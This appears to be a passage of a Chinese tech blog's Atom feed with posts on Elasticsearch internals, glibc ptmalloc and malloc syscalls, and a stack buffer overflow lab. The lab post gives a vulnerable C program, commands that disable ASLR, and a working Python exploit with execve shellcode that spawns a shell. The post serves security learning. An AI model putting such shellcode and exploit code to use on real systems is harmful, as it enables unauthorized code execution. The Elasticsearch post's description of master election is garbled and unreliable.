    <content type="html"><![CDATA[<h2 id="ElasticSearch基本原理介绍"><a href="#ElasticSearch基本原理介绍" class="headerlink" title="ElasticSearch基本原理介绍"></a>ElasticSearch基本原理介绍</h2><h3 id="索引结构"><a href="#索引结构" class="headerlink" title="索引结构"></a>索引结构</h3><p>在存储结构上，由_index, _type和_id唯一标示一个文档。_index指向一个或者多个物理分片的逻辑命名空间，_type类型用于区分同一个集合中的不同的细分。_id文档标识符由系统自动生成或者使用者提供。</p><h3 id="分片"><a href="#分片" class="headerlink" title="分片"></a>分片</h3><p>ES将数据副本分为主从两个部分，即主分片和副分片。主分片为权威数据，写过程先写主分片，成功之后再写副分片，恢复过程以主分片为主。 </p><h3 id="集群内部原理"><a href="#集群内部原理" class="headerlink" title="集群内部原理"></a>集群内部原理</h3><p>集群节点角色：</p><ol><li>主节点</li></ol><p>主节点负责集群层面的相关操作，管理集群变更</p><p>通过配置node.master:true节点具有被选举为master的资格，主节点是全局唯一的，将从有资格成为master的节点中进行选举。</p><p>主节点也可以成为数据节点，但尽可能的做少量的工作，因此生产环境应尽量分离主节点和数据节点，创建独立节点的配置：</p><p>node.master: true</p><p>node.data: false</p><p>为了防止数据丢失，每个主节点应该知道有资格成为主节点的数目，默认为1，为了避免网络分区时候出现多主的情况，配置discovery.zen.minimum_master_nodes原则上最小值应该是（master_eligible_nodes/2）+1</p><ol start="2"><li>数据节点</li></ol><p>负责保存数据，执行数据相关操作，CRUD，搜索，聚合等，数据节点对CPU，内存，IO要求较高。通过配置node.data: true来使一个节点成为数据节点。也可以通过下面的配置:</p><p>node.master: false</p><p>node.data: true</p><p>node.ingest: false</p><ol start="3"><li>预处理节点</li></ol><p>预处理节点在5.0之后引入。默认情况下在所有的节点上启用ingest，如果想在某个节点上禁用ingest，则可以添加配置node.ingest: false。也可以通过下面的配置创建一个仅用于预处理的节点：</p><p>node.master: false</p><p>node.data: false</p><p>node.ingest：false</p><ol start="4"><li>协调节点</li></ol><p>客户端请求可以发送到集群的任意节点，每个节点都知道任意文档所在的位置，然后转发这些请求，收集数据并返回给客户端，处理客户端请求的节点称为协调节点。</p><p>协调节点将请求转发给保存数据的数据节点。每个数据节点在本地执行请求，并将结果返回给协调节点，协调节点收集完数据之后将数据节点的结果合并为单个全局结果，对结果收集和排序的过程可能需要很多CPU和内存资源。</p><p>配置：</p><p>node.master: false</p><p>node.data: false</p><p>node.ingest: false</p><ol start="5"><li>部落节点</li></ol><p>允许部落节点在多个集群之间充当联合客户端</p><p>客户端的属性：</p><p>node.master: false</p><p>node.data: false</p><p>它不做主节点，不做数据节点，仅用于路由请求，本质上是一个智能负载均衡器。</p><h3 id="集群的健康度状态"><a href="#集群的健康度状态" class="headerlink" title="集群的健康度状态"></a>集群的健康度状态</h3><p>集群的健康度状态分为三种：</p><ol><li>Green: 主分片和副分片都正常运行</li><li>Yellow: 所有的主分片都正常运行，但不是所有的副分片都正常运行，意味着有单点故障的风险。</li><li>Red: 有主分片没能正常运行</li></ol><h3 id="集群扩容"><a href="#集群扩容" class="headerlink" title="集群扩容"></a>集群扩容</h3><p>当扩容集群，添加节点时候，分片会均衡地分配到集群的每个节点上，从而对索引和搜索过程进行负载均衡，这些都是系统自动完成。</p><p>分片副本实现数据冗余，从而防止硬件故障导致的数据丢失。</p><h3 id="主要内部模块介绍"><a href="#主要内部模块介绍" class="headerlink" title="主要内部模块介绍"></a>主要内部模块介绍</h3><h4 id="Cluster"><a href="#Cluster" class="headerlink" title="Cluster"></a>Cluster</h4><p>Cluster模块是主节点执行集群管理的我封装实现，管理集群状态，维护集群层面的配置信息。主要功能：</p><ul><li>管理集群状态，将新生成的集群状态发布到集群节点</li><li>调用allocation模块执行分片分配，决策那些分片应该分配到哪个节点</li><li>集群各节点中直接迁移分片，保持数据平衡</li></ul><h4 id="allocation"><a href="#allocation" class="headerlink" title="allocation"></a>allocation</h4><p>封装分片分配相关的功能和策略，包括主分片的分配和副分片的分配，本模块由主节点调用。创建新索引，集群完全重启都需要分片分配的过程</p><h4 id="Discovery"><a href="#Discovery" class="headerlink" title="Discovery"></a>Discovery</h4><p>发现模块负责发现集群中的节点，以及选举主节点。当节点加入或退出集群时，主节点会采取相应的行动。</p><h4 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h4><p>负责对收到Master广播下来的集群状态数据的持久化存储，并在集群完全重启时恢复他们。</p><h4 id="Indices"><a href="#Indices" class="headerlink" title="Indices"></a>Indices</h4><p>索引模块管理全局级的索引设置，不包括索引级的，它还封装了索引数据恢复功能。集群启动阶段需要的主分片恢复和副分片恢复就是在这个模块实现。</p><h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p>HTTP模块允许通过JSON over HTTP的方式访问ES的API，HTTP模块本质上完全异步的，意味着没有阻塞线程等待响应。使用异步通信进行HTTP的好处是解决了C10k问题（10k量级的并发连接）。</p><p>在部分场景中，可考虑使用HTTP keepalive来提升性能，注意，不要在客户端使用http chunking</p><h4 id="Transport"><a href="#Transport" class="headerlink" title="Transport"></a>Transport</h4><p>传输模块用于集群内节点之间的内部通信，从一个节点到另一个节点的每个请求都使用传输模块。</p><h4 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h4><p>Engine模块封装了对Lucene的操作及translog的调用，它是对一个分片读写操作的最终提供者。</p><h3 id="选主算法"><a href="#选主算法" class="headerlink" title="选主算法"></a>选主算法</h3><p>bolly算法：选择ID较大的，在es中选择id较小的机器为master节点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ElasticSearch基本原理介绍&quot;&gt;&lt;a href=&quot;#ElasticSearch基本原理介绍&quot; class=&quot;headerlink&quot; title=&quot;ElasticSearch基本原理介绍&quot;&gt;&lt;/a&gt;ElasticSearch基本原理介绍&lt;/h2&gt;&lt;h3 i
      
    
    </summary>
    
    
      <category term="ElasticSearch" scheme="http://www.yorzorzy.xyz/categories/ElasticSearch/"/>
    
    
      <category term="ElasticSearch" scheme="http://www.yorzorzy.xyz/tags/ElasticSearch/"/>
    
  </entry>
  
  <entry>
    <title>ptmalloc学习</title>
    <link href="http://www.yorzorzy.xyz/2020/01/26/ptmalloc%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.yorzorzy.xyz/2020/01/26/ptmalloc%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-01-26T11:02:18.842Z</published>
    <updated>2020-01-26T11:02:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ptmalloc学习"><a href="#ptmalloc学习" class="headerlink" title="ptmalloc学习"></a>ptmalloc学习</h2><p>ptmalloc2 是linux glibc中当前使用的内存堆分配。之前使用的dlmalloc，现在逐步都被支持多线程的ptmalloc来替代了。</p><p>我们之前学习过系统底层是调用的brk和mmap来实现内存分配的。</p><p>ptmalloc2多线程情况下分配内存的时候，每个线程有一个独立的heap segment和freelist数据结构保持于其他堆独立。这个行为我们称作为per thread arena;</p><p>需要注意的是，即使用户请求内存只有1000字节，堆内存分配的时候还是会提供132KB大小被创建。这种连续的堆内存区域我们称作为arena。主线程创建的我们称作为main arena;</p><p>如果当程序超过了这个arena区域可用空寂哦哦安的时候，他能够增加通过程序break位置的方式。top chunk大小可以适配 extra space空间。类似的如果有很多可用空间在top chunk中的时候，他可以缩小。</p><p>除了这个1ＭＢ的堆分配外，只有132KB的读写权限被设置，因此这个连续的内存区域被称作为thread arena;如果超过128KB（132*1024）请求大小，超过了malloc可用空间的时候，内存分配通过使用mmap系统调用来申请，无论请求来自于main arena还是thread arena; arena的限制来自于系统的cores数目；</p><p>32bit: Number of arena = 2 * number of cores;</p><p>63bit: Number of arena = 8 * number of cores;</p><p>heap的主要信息有下面这些：</p><p>heap_info： heap header信息，单线程thread arena能有多堆。</p><p>malloc_state: arena header</p><p>malloc_chunk:  chunk_header</p><p>main arena因为没有多heap，所以没有heap_info。不像thread arena，main arena header不是sbrk的 heap segment的一部分。他是一个全局变量，因此可以在libc.so data segment找到。</p><p><img src="https://docs.google.com/drawings/d/1367fdYcRTvkyfZ_s27yg6oJp5KYsVAuYqPf8szbRNc0/pub?w=960&h=720" alt="img"></p><p><img src="https://docs.google.com/drawings/d/1367fdYcRTvkyfZ_s27yg6oJp5KYsVAuYqPf8szbRNc0/pub?w=960&h=720" alt="img"></p><p><img src="https://docs.google.com/drawings/d/150bTi0uScQlnABDImLYS8rWyL82mmfpMxzRbx-45UKw/pub?w=960&h=720" alt="img"></p><p>chunk: 一个chunk包含在一个heap segment中，包括以下几个：</p><ol><li><p>allocated chunk</p><p><img src="https://docs.google.com/drawings/d/1eLkG-WF9U3O_ytNs6iFKHacqkjWZeY4KtLqxmd01EVs/pub?w=962&h=682" alt="img"></p></li><li><p>free chunk</p><p><img src="https://docs.google.com/drawings/d/1YrlnGa081NpO0D3wcoaJbGvhnPi3X6bBKMc3bN4-oZQ/pub?w=940&h=669" alt="img"></p><p>其中 bins是freelist的数据结构，在free chunk中被使用。</p><p>fast bin, unsorted bin, small bin, large bin</p><p>fastbinsY： 这个数组支持fastbins</p><p>bins: bin1  unsorted bin, bin2-bin63 small bin, bin64-bin126 large bin;</p><p>fastbin: chunk大小在16-80字节被称作为fast chunk;</p><p><img src="https://docs.google.com/drawings/d/144diIfbLqUmOPlAWbtP45mGsZlIl3PZWJvvH-cvQziU/pub?w=960&h=720" alt="img"></p><p>unsorted bin: </p><p>当释放小块或大块时，而不是将它们添加到各自的容器，将他们释放的空间放入unsortedbin中。这种方式给了glibc malloc重用最近释放的chunk的机会。因此，内存分配和释放会加快一点。因为寻找合适的垃圾箱所花费的时间减少了。</p><p><img src="https://docs.google.com/drawings/d/1Kf_eg7uB2mRjSOasTc4dIu5fuBpTAK0GxbnKVTkZd0Y/pub?w=1217&h=865" alt="img"></p><p>small bin: chunk小于512字节的被称作为small chunk;</p><p>large bin: chunk大于512字节的被称作为large chunk;</p></li><li><p>Top Chunk：</p><p>在top边界上的arena被称作为top chunk;</p></li><li><p>Last Remainder Chunk：</p><p>从最近的一个小请求分裂。最后的剩余块有助于改善引用的局部性，即小块的连续的malloc请求可能最终被分配到彼此接近的地方。</p></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p><p><a href="https://www.cnblogs.com/alisecurity/p/5486458.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisecurity/p/5486458.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ptmalloc学习&quot;&gt;&lt;a href=&quot;#ptmalloc学习&quot; class=&quot;headerlink&quot; title=&quot;ptmalloc学习&quot;&gt;&lt;/a&gt;ptmalloc学习&lt;/h2&gt;&lt;p&gt;ptmalloc2 是linux glibc中当前使用的内存堆分配。之前使用
      
    
    </summary>
    
    
      <category term="malloc" scheme="http://www.yorzorzy.xyz/categories/malloc/"/>
    
    
      <category term="malloc" scheme="http://www.yorzorzy.xyz/tags/malloc/"/>
    
  </entry>
  
  <entry>
    <title>Linux Malloc底层分配原理【翻译】</title>
    <link href="http://www.yorzorzy.xyz/2020/01/24/linux%E5%86%85%E5%AD%98malloc%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/"/>
    <id>http://www.yorzorzy.xyz/2020/01/24/linux%E5%86%85%E5%AD%98malloc%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/</id>
    <published>2020-01-24T06:56:22.335Z</published>
    <updated>2020-01-24T06:56:01.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux-Malloc底层分配原理【翻译】"><a href="#Linux-Malloc底层分配原理【翻译】" class="headerlink" title="Linux Malloc底层分配原理【翻译】"></a>Linux Malloc底层分配原理【翻译】</h2><p>linux中malloc函数还是通过syscall来分配内存的。通过调用brk或者mmap syscall函数来分配内存。</p><p><img src="https://docs.google.com/drawings/d/105HDvkEvIW2lsyaQjj758Lbyx6A-_K7jviheyzeAwl8/pub?w=480&h=238" alt="img"></p><p>brk函数：从内核分配内存（非0初始化）通过增加程序break位置来实现。初始化堆segment得开始与结束指向相同的位置。</p><p>如果ASLR关闭的时候，start_brk和brk将指向data/bss segment结束的位置。</p><p>如果ASLR打开的时候，start_brk和brk将等于data/bss segment结束的位置通过随机brk offset</p><p><img src="https://i2.wp.com/static.duartes.org/img/blogPosts/linuxFlexibleAddressSpaceLayout.png" alt="img"></p><p>mmap: malloc函数使用mmap来创建一个私有匿名映射segment.分配私有匿名的主要目的是分配一个新的内存（0填充的）这个新的内存将被调用进程的时候额外使用。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a></p><p><a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/" target="_blank" rel="noopener">https://manybutfinite.com/post/anatomy-of-a-program-in-memory/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux-Malloc底层分配原理【翻译】&quot;&gt;&lt;a href=&quot;#Linux-Malloc底层分配原理【翻译】&quot; class=&quot;headerlink&quot; title=&quot;Linux Malloc底层分配原理【翻译】&quot;&gt;&lt;/a&gt;Linux Malloc底层分配原理【翻
      
    
    </summary>
    
    
      <category term="malloc" scheme="http://www.yorzorzy.xyz/categories/malloc/"/>
    
    
      <category term="malloc" scheme="http://www.yorzorzy.xyz/tags/malloc/"/>
    
  </entry>
  
  <entry>
    <title>pwn学习笔记1</title>
    <link href="http://www.yorzorzy.xyz/2020/01/23/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.yorzorzy.xyz/2020/01/23/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-01-23T03:05:13.595Z</published>
    <updated>2020-01-23T03:04:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn学习笔记1"><a href="#pwn学习笔记1" class="headerlink" title="pwn学习笔记1"></a>pwn学习笔记1</h2><h3 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h3><p>其实参考的是<a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。</a></p><p>环境：ubuntu14.04</p><p>漏洞代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是简单的栈溢出利用，超过256个字符的时候会发生栈溢出问题。</p><p>首先我们需要关闭内存地址随机化。保证栈溢出地址固定。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; <span class="regexp">/proc/sys</span><span class="regexp">/kernel/randomize</span>_va_space</span><br></pre></td></tr></table></figure><p>编译和打开栈执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -z execstack -o vul1 vul1.c</span><br><span class="line">chmod +s vul1</span><br></pre></td></tr></table></figure><p>gdb调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">saar@saar-virtual-machine:~/pwn$ gdb vul1 </span><br><span class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</span><br><span class="line">Copyright (C) 2014 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type "show copying"</span><br><span class="line">and "show warranty" for details.</span><br><span class="line">This GDB was configured as "i686-linux-gnu".</span><br><span class="line">Type "show configuration" for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type "help".</span><br><span class="line">Type "apropos word" to search for commands related to "word"...</span><br><span class="line">Reading symbols from vul1...done.</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> dis</span></span><br><span class="line">disable      disassemble  disconnect   display      distance     </span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> disassemble main</span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0804844d &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x0804844e &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x08048450 &lt;+3&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x08048453 &lt;+6&gt;:     sub    esp,0x110</span><br><span class="line">   0x08048459 &lt;+12&gt;:    mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">   0x0804845c &lt;+15&gt;:    add    eax,0x4</span><br><span class="line">   0x0804845f &lt;+18&gt;:    mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x08048461 &lt;+20&gt;:    mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x08048465 &lt;+24&gt;:    lea    eax,[esp+0x10]</span><br><span class="line">   0x08048469 &lt;+28&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804846c &lt;+31&gt;:    call   0x8048320 &lt;strcpy@plt&gt;</span><br><span class="line">   0x08048471 &lt;+36&gt;:    lea    eax,[esp+0x10]</span><br><span class="line">   0x08048475 &lt;+40&gt;:    mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x08048479 &lt;+44&gt;:    mov    DWORD PTR [esp],0x8048520</span><br><span class="line">   0x08048480 &lt;+51&gt;:    call   0x8048310 &lt;printf@plt&gt;</span><br><span class="line">   0x08048485 &lt;+56&gt;:    mov    eax,0x0</span><br><span class="line">   0x0804848a &lt;+61&gt;:    leave  </span><br><span class="line">   0x0804848b &lt;+62&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> r `python -c <span class="string">'print "A"*400'</span>`</span></span><br><span class="line">Starting program: /home/saar/pwn/vul1 `python -c 'print "A"*400'`</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0xb7fc0000 --&gt; 0x1acda8 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0xb7fc1898 --&gt; 0x0 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x41414141 ('AAAA')</span><br><span class="line">ESP: 0xbffff460 ('A' &lt;repeats 128 times&gt;)</span><br><span class="line">EIP: 0x41414141 ('AAAA')</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41414141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff460 ('A' &lt;repeats 128 times&gt;)</span><br><span class="line">0004| 0xbffff464 ('A' &lt;repeats 124 times&gt;)</span><br><span class="line">0008| 0xbffff468 ('A' &lt;repeats 120 times&gt;)</span><br><span class="line">0012| 0xbffff46c ('A' &lt;repeats 116 times&gt;)</span><br><span class="line">0016| 0xbffff470 ('A' &lt;repeats 112 times&gt;)</span><br><span class="line">0020| 0xbffff474 ('A' &lt;repeats 108 times&gt;)</span><br><span class="line">0024| 0xbffff478 ('A' &lt;repeats 104 times&gt;)</span><br><span class="line">0028| 0xbffff47c ('A' &lt;repeats 100 times&gt;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41414141 in ?? ()</span><br></pre></td></tr></table></figure><p>esp 地址是：0xbffff460，</p><p>发现ret_address需要保证esp+N&lt;nop的数目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stack address where shellcode is copied.</span></span><br><span class="line">ret_addr = <span class="number">0xbffff480</span>      </span><br><span class="line">              </span><br><span class="line"><span class="comment">#Spawn a shell</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endianess convertion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span></span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf = Junk + RA + NOP's + Shellcode</span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += <span class="string">"\x90"</span> * <span class="number">40</span></span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span></span><br><span class="line">call([<span class="string">"./vul1"</span>, buf])</span><br></pre></td></tr></table></figure><p>最后获取shell:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">saar@saar-virtual-machine:~/pwn$ python exp.py </span><br><span class="line">Calling vulnerable program</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1/shh/bin</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> id</span></span><br><span class="line">uid=1000(saar) gid=1000(saar) groups=1000(saar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.jianshu.com/p/187b810e78d2" target="_blank" rel="noopener">https://www.jianshu.com/p/187b810e78d2</a></p><p><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;pwn学习笔记1&quot;&gt;&lt;a href=&quot;#pwn学习笔记1&quot; class=&quot;headerlink&quot; title=&quot;pwn学习笔记1&quot;&gt;&lt;/a&gt;pwn学习笔记1&lt;/h2&gt;&lt;h3 id=&quot;学习笔记&quot;&gt;&lt;a href=&quot;#学习笔记&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://www.yorzorzy.xyz/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://www.yorzorzy.xyz/tags/pwn/"/>
    
  </entry>
  
</feed>
